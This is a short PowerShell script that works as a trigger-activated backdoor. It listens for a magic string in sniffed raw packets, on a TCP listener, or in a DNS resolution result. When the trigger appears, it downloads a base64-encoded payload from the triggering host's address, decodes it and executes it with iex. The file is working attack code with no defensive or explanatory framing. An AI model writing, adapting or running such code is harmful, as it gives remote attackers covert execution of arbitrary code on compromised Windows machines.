function Invoke-CallbackIEX {
    param([string]$CallbackIP)
    $enc = (New-Object Net.WebClient).DownloadString("http://$CallbackIP/resource")
    $b = [System.Convert]::FromBase64String($enc)
    $dec = [System.Text.Encoding]::UTF8.GetString($b)
    iex $dec
}
function Wait-Packet {
    param($socket, $byteIn, $byteOut, $byteData, $Trigger)
    $socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll,$byteIn,$byteOut)
    $rcv = $socket.Receive($byteData)
    $SourceIPAddress = [System.Net.IPAddress]$byteData[12..15]
    $RemainderOfPacket = [Text.Encoding]::ASCII.GetString($byteData)
    if ($RemainderOfPacket -match $Trigger) {
        $match = $SourceIPAddress
        Invoke-CallbackIEX $match
    }
}
function Wait-Tcp {
    param($Listener, $Trigger)
    $Client = $Listener.AcceptTcpClient()
    $Reader = New-Object System.IO.StreamReader($Client.GetStream())
    $line = $Reader.ReadLine()
    if ($line -eq $Trigger) {
        $match = ([System.Net.IPEndPoint] $Client.Client.RemoteEndPoint).Address.ToString()
        Invoke-CallbackIEX $match
    }
}
function Wait-Dns {
    param($Hostname, $Trigger)
    foreach ($addr in [System.Net.Dns]::GetHostAddresses($Hostname)) {
        $resolved = $addr.IPAddressToString
        if ($resolved -ne $Trigger) {
            $match = $resolved
            Invoke-CallbackIEX $match
        }
    }
}
